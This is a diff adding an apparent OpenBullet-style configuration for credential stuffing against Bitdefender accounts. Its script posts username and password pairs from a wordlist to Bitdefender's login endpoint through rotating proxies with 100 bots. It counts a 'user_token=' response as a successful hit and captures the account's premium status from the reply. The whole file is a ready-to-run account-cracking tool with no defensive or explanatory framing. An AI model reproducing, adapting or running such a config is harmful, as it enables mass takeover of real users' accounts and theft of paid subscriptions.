@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "Bitdefender",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-05T09:05:44.4308919+02:00",
+  "AdditionalInfo": "",
+  "Author": "Shaidow",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 10,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://login.bitdefender.net/v1/user/login" 
+  CONTENT "{\"user\":\"<USER>\",\"pass\":\"<PASS>\",\"remember\":false,\"redirect_url\":\"https://central.bitdefender.com/activity\",\"partner_id\":\"com.bitdefender\",\"lang\":\"en_US\",\"timestamp\":1554443541069}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user_token=" 
+  KEYCHAIN Failure OR 
+    KEY "Cannot login " 
+PARSE "<SOURCE>" LR "\",\"account\":\"" "\",\"" -> CAP "Premium :" 
